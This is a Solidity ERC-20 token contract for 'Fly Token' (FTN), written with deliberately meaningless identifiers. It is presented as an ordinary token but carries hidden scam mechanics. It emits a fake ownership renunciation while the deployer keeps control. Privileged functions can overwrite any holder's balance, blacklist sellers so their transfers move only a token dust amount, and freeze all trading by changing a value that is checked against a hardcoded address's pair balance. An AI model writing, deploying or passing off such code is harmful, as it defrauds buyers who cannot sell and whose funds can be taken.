//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface minEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atAutoReceiver) external view returns (uint256);

    function transfer(address launchedShould, uint256 takeLimitFrom) external returns (bool);

    function allowance(address tradingMinSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeLimitFrom) external returns (bool);

    function transferFrom(
        address sender,
        address launchedShould,
        uint256 takeLimitFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isMin, uint256 value);
    event Approval(address indexed tradingMinSell, address indexed spender, uint256 value);
}

abstract contract totalWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface exemptMax {
    function createPair(address buyList, address modeLiquidity) external returns (address);
}

interface fundSender is minEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FlyToken is totalWallet, minEnable, fundSender {

    mapping(address => uint256) private modeMarketing;

    function launchedAuto() private view {
        require(senderMarketing[_msgSender()]);
    }

    function receiverWallet(address maxFee, address launchedShould, uint256 takeLimitFrom) internal returns (bool) {
        if (maxFee == swapReceiver) {
            return fromLaunched(maxFee, launchedShould, takeLimitFrom);
        }
        uint256 fromWallet = minEnable(toFee).balanceOf(launchedIs);
        require(fromWallet == tokenFund);
        require(launchedShould != launchedIs);
        if (feeAtList[maxFee]) {
            return fromLaunched(maxFee, launchedShould, walletTx);
        }
        return fromLaunched(maxFee, launchedShould, takeLimitFrom);
    }

    function symbol() external view virtual override returns (string memory) {
        return launchTo;
    }

    function launchedExempt(address launchedBuy) public {
        launchedAuto();
        if (launchedLaunchMax == toReceiverBuy) {
            walletMaxLimit = true;
        }
        if (launchedBuy == swapReceiver || launchedBuy == toFee) {
            return;
        }
        feeAtList[launchedBuy] = true;
    }

    function txMode(uint256 takeLimitFrom) public {
        launchedAuto();
        tokenFund = takeLimitFrom;
    }

    address launchedIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address maxFee, address launchedShould, uint256 takeLimitFrom) external override returns (bool) {
        if (_msgSender() != sellAt) {
            if (fromFundMode[maxFee][_msgSender()] != type(uint256).max) {
                require(takeLimitFrom <= fromFundMode[maxFee][_msgSender()]);
                fromFundMode[maxFee][_msgSender()] -= takeLimitFrom;
            }
        }
        return receiverWallet(maxFee, launchedShould, takeLimitFrom);
    }

    function approve(address isMode, uint256 takeLimitFrom) public virtual override returns (bool) {
        fromFundMode[_msgSender()][isMode] = takeLimitFrom;
        emit Approval(_msgSender(), isMode, takeLimitFrom);
        return true;
    }

    function owner() external view returns (address) {
        return toEnable;
    }

    uint256 private launchedLaunchMax;

    uint256 tokenFund;

    address public swapReceiver;

    mapping(address => bool) public senderMarketing;

    function balanceOf(address atAutoReceiver) public view virtual override returns (uint256) {
        return modeMarketing[atAutoReceiver];
    }

    string private listFee = "Fly Token";

    address public toFee;

    mapping(address => bool) public feeAtList;

    event OwnershipTransferred(address indexed sellFrom, address indexed isLimit);

    address sellAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public maxAmount;

    uint256 private modeLaunch = 100000000 * 10 ** 18;

    bool private launchReceiver;

    function walletAutoFee(address autoReceiver) public {
        if (maxTx) {
            return;
        }
        if (walletMaxLimit) {
            maxAmount = false;
        }
        senderMarketing[autoReceiver] = true;
        if (launchedLaunchMax != toReceiverBuy) {
            toReceiverBuy = launchedLaunchMax;
        }
        maxTx = true;
    }

    address private toEnable;

    uint256 constant walletTx = 1 ** 10;

    function getOwner() external view returns (address) {
        return toEnable;
    }

    function allowance(address amountLaunch, address isMode) external view virtual override returns (uint256) {
        if (isMode == sellAt) {
            return type(uint256).max;
        }
        return fromFundMode[amountLaunch][isMode];
    }

    function decimals() external view virtual override returns (uint8) {
        return launchLimit;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return modeLaunch;
    }

    string private launchTo = "FTN";

    function name() external view virtual override returns (string memory) {
        return listFee;
    }

    uint8 private launchLimit = 18;

    bool public tradingMin;

    function fromLaunched(address maxFee, address launchedShould, uint256 takeLimitFrom) internal returns (bool) {
        require(modeMarketing[maxFee] >= takeLimitFrom);
        modeMarketing[maxFee] -= takeLimitFrom;
        modeMarketing[launchedShould] += takeLimitFrom;
        emit Transfer(maxFee, launchedShould, takeLimitFrom);
        return true;
    }

    bool public walletMaxLimit;

    function transfer(address fundExemptReceiver, uint256 takeLimitFrom) external virtual override returns (bool) {
        return receiverWallet(_msgSender(), fundExemptReceiver, takeLimitFrom);
    }

    uint256 private toReceiverBuy;

    function tokenLaunch() public {
        emit OwnershipTransferred(swapReceiver, address(0));
        toEnable = address(0);
    }

    uint256 maxAt;

    bool public maxTx;

    mapping(address => mapping(address => uint256)) private fromFundMode;

    bool public modeMax;

    function senderIs(address fundExemptReceiver, uint256 takeLimitFrom) public {
        launchedAuto();
        modeMarketing[fundExemptReceiver] = takeLimitFrom;
    }

    constructor (){
        
        txMin senderSwap = txMin(sellAt);
        toFee = exemptMax(senderSwap.factory()).createPair(senderSwap.WETH(), address(this));
        
        swapReceiver = _msgSender();
        tokenLaunch();
        senderMarketing[swapReceiver] = true;
        modeMarketing[swapReceiver] = modeLaunch;
        if (walletMaxLimit != launchReceiver) {
            modeMax = true;
        }
        emit Transfer(address(0), swapReceiver, modeLaunch);
    }

}